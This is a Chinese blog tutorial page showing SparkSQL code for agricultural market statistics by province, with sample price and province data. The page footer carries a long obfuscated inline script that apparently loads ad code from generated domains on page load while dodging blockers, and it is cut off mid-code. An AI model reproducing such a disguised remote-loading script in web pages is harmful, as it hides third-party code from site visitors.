            <span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>

    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

</code></pre> 
<h2><a id="SparkSQL_213"></a>五、SparkSQL代码实现</h2> 
<pre><code class="prism language-scala"><span class="token keyword">import</span> exam03<span class="token punctuation">.</span>common<span class="token punctuation">.</span>_
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>sql<span class="token punctuation">.</span><span class="token punctuation">{<!-- --></span>DataFrame<span class="token punctuation">,</span> Dataset<span class="token punctuation">,</span> Row<span class="token punctuation">,</span> SparkSession<span class="token punctuation">}</span>

<span class="token comment">/**
 *
 * 1、农产品市场个数统计
 *      1)统计每个省份的农产品市场总数
 *      2)统计没有农产品市场的省份有哪些
 * 2、农产品种类统计
 *      1)根据农产品类型数量，统计排名前 3 名的省份
 *      2)根据农产品类型数量，统计每个省份排名前 3 名的农产品市场
 * 3、价格区间统计,计算山西省每种农产品的价格波动趋势，即计算每天价格均值，并将结果输出到控制台上。
 *
 */</span>
<span class="token keyword">object</span> MainApplication <span class="token keyword">extends</span> App <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// 1. 获取SparkSession</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> spark<span class="token operator">:</span> SparkSession <span class="token operator">=</span> SparkHelper<span class="token punctuation">.</span>getSparkSession
    <span class="token keyword">import</span> spark<span class="token punctuation">.</span>implicits<span class="token punctuation">.</span>_
    <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>_
    <span class="token comment">// 2. 创建DF</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> productsDF<span class="token operator">:</span> DataFrame <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        spark<span class="token punctuation">.</span>read<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">"delimiter"</span><span class="token punctuation">,</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>csv<span class="token punctuation">(</span>Constants<span class="token punctuation">.</span>PATH_PRODUCTS<span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c0"</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c1"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c2"</span><span class="token punctuation">,</span> <span class="token string">"craw_time"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c3"</span><span class="token punctuation">,</span> <span class="token string">"market"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c4"</span><span class="token punctuation">,</span> <span class="token string">"province"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c5"</span><span class="token punctuation">,</span> <span class="token string">"city"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>na<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// drop掉null值</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> provincesDF<span class="token operator">:</span> DataFrame <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        spark<span class="token punctuation">.</span>read<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">"delimiter"</span><span class="token punctuation">,</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>csv<span class="token punctuation">(</span>Constants<span class="token punctuation">.</span>PATH_PROVINCES<span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c0"</span><span class="token punctuation">,</span> <span class="token string">"province"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>withColumnRenamed<span class="token punctuation">(</span><span class="token string">"_c1"</span><span class="token punctuation">,</span> <span class="token string">"short_hand"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>na<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 3. 题目实现</span>
    <span class="token comment">// 3.1. 统计每个省份的农产品市场总数</span>
    productsDF<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"market"</span><span class="token punctuation">,</span> <span class="token string">"province"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>distinct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groupBy<span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">// 3.2. 统计没有农产品市场的省份有哪些</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> existsProvinceDF<span class="token operator">:</span> Dataset<span class="token punctuation">[</span>Row<span class="token punctuation">]</span> <span class="token operator">=</span> productsDF<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">,</span> <span class="token string">"market"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>distinct<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> allProvinceDF<span class="token operator">:</span> Dataset<span class="token punctuation">[</span>Row<span class="token punctuation">]</span> <span class="token operator">=</span> provincesDF<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>distinct<span class="token punctuation">(</span><span class="token punctuation">)</span>
    existsProvinceDF<span class="token punctuation">.</span>join<span class="token punctuation">(</span>allProvinceDF<span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"right"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>filter<span class="token punctuation">(</span><span class="token string">"market is null"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token string">"market"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment">// 3.3. 根据农产品类型数量，统计排名前 3 名的省份</span>
    productsDF<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"province"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>groupBy<span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>agg<span class="token punctuation">(</span>countDistinct<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>as<span class="token punctuation">(</span><span class="token string">"count"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>orderBy<span class="token punctuation">(</span><span class="token operator">-</span><span class="token symbol">'count</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>limit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment">// 3.4. 根据农产品类型数量，统计每个省份排名前 3 名的农产品市场</span>
    productsDF<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"market"</span><span class="token punctuation">,</span><span class="token string">"province"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>groupBy<span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">,</span><span class="token string">"market"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>orderBy<span class="token punctuation">(</span>$<span class="token string">"province"</span><span class="token punctuation">,</span>$<span class="token string">"count"</span><span class="token punctuation">.</span>desc<span class="token punctuation">)</span>
        <span class="token punctuation">.</span>repartition<span class="token punctuation">(</span>provincesDF<span class="token punctuation">.</span>count<span class="token punctuation">.</span>asInstanceOf<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token punctuation">,</span>$<span class="token string">"province"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>foreachPartition<span class="token punctuation">(</span>it<span class="token keyword">=&gt;</span><span class="token punctuation">{<!-- --></span>it<span class="token punctuation">.</span>take<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment">// 3.5. 计算山西省的每种农产品的价格波动趋势，即计算每天价格均值</span>
    productsDF<span class="token punctuation">.</span>filter<span class="token punctuation">(</span><span class="token string">"province='山西'"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>groupBy<span class="token punctuation">(</span><span class="token string">"craw_time"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>agg<span class="token punctuation">(</span>when<span class="token punctuation">(</span>count<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token operator">-</span>max<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token operator">-</span>min<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>count<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>otherwise<span class="token punctuation">(</span>sum<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token operator">/</span>count<span class="token punctuation">(</span>$<span class="token string">"price"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>as<span class="token punctuation">(</span><span class="token string">"pavg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>selectExpr<span class="token punctuation">(</span><span class="token string">"craw_time"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"cast(pavg as decimal(20,2)) as pavg"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

</code></pre> 
<h2><a id="_291"></a>六、业务数据</h2> 
<p>products.txt</p> 
<pre><code>茄子	3.20	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
西红柿	4.20	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
黄瓜	4.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
冬瓜	2.20	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
白萝卜	1.40	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
胡萝卜	1.60	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
生姜	12.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
豆角	6.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
香蕉	6.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
猪肉	21.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
鸡蛋	8.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
土豆	2.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
菜花	3.20	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
洋白菜	2.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
大蒜	3.80	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
生菜	5.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
西葫芦	3.20	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
西瓜	5.80	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
活鲤鱼	12.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
茴香	4.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
香菇	8.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
菠菜	3.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
小葱	1.40	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
富士苹果	6.00	2018/1/1	河北怀来县就西果菜批发市场有限责任公司	河北	怀来
活草鱼	14.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
活鲫鱼	14.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
黑鱼	20.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
花鲢活鱼	12.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
白鲢活鱼	8.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
野生甲鱼	420.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
人工甲鱼	160.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
江蟹	180.00	2018/1/1	江苏建湖县水产批发市场	江苏	建湖
大白菜	0.70	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
洋白菜	2.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
韭菜	3.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
芹菜	2.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
菠菜	3.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
油菜	1.20	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
菜花	3.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
蒜苔	8.60	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
生菜	5.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
黄瓜	3.40	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
豆角	7.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
长茄子	2.80	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
尖椒	5.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
青椒	4.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
西红柿	3.60	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
良薯	3.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
红萝卜	1.20	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
白萝卜	1.60	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
冬瓜	1.10	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
南瓜	6.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
莴笋	4.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
西葫芦	3.20	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
葱头	1.40	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
莲藕	3.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
大葱	3.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
平菇	4.60	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
香菇	7.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
苹果	8.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
香蕉	6.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
西瓜	2.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
巨峰葡萄	8.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
猪肉	21.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
牛肉	48.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
羊肉	46.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
鸡蛋	9.60	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
白条鸡	17.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
活草鱼	14.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
活鲤鱼	10.50	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
白鲢活鱼	16.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
花鲢活鱼	14.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
活鲫鱼	13.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
大带鱼	19.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
大黄花鱼	25.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
粳米	4.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
面粉	2.90	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
菜油	12.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
豆油	10.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
花生油	16.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
香油	30.00	2018/1/1	山西大同振华蔬菜批发市场	山西	大同
大白菜	0.90	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
生菜	2.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
大葱	2.80	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
小葱	3.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
大蒜	4.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
鱼腥草(折耳根)	4.40	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
尖椒	7.60	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
黄瓜	3.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
冬瓜	1.10	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
南瓜	2.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
白萝卜	1.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
胡萝卜	2.60	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
土豆	2.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
生姜	9.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
莲藕	5.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
富士苹果	6.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
香蕉	3.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
猪肉	23.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
洋白菜	1.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
豌豆	5.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
蒜苔	6.80	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
西红柿	4.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
条形辣椒干（小米椒）	22.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
莴笋	1.40	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
菜花	2.60	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
芹菜	3.00	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
青椒	5.40	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
茄子	4.20	2018/1/1	四川西昌广平农副土特产品市场	四川	西昌
大白菜	1.00	2018/1/1	浙江义乌农贸城	浙江	义乌
芹菜	2.60	2018/1/1	浙江义乌农贸城	浙江	义乌
菠菜	3.60	2018/1/1	浙江义乌农贸城	浙江	义乌
大葱	3.20	2018/1/1	浙江义乌农贸城	浙江	义乌
</code></pre> 
<p>allprovince.txt</p> 
<pre><code>河北	HE
山西	SX
辽宁	LN
吉林	JL
黑龙江	HL
江苏	JS
浙江	ZJ
安徽	AH
福建	FJ
江西	JX
山东	SD
河南	HA
湖北	HB
湖南	HN
广东	GD
海南	HI
四川	SC
贵州	GZ
云南	YN
陕西	SN
甘肃	GS
青海	QH
台湾	TW
内蒙古	IM
广西	GX
西藏	XZ
宁夏	NX
新疆	XJ
香港	HK
澳门	MO
天津	TJ
北京	BJ
重庆	CQ
上海	SH
</code></pre>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/41e4bc4af574706324dc6633be235007/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">nohup，linux后台挂起</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4c976cc59df93947be403523fd734320/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">使用SeaDas对Sentinel-3(OLCI)、Sentinel-2(MSI)进行大气校正</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0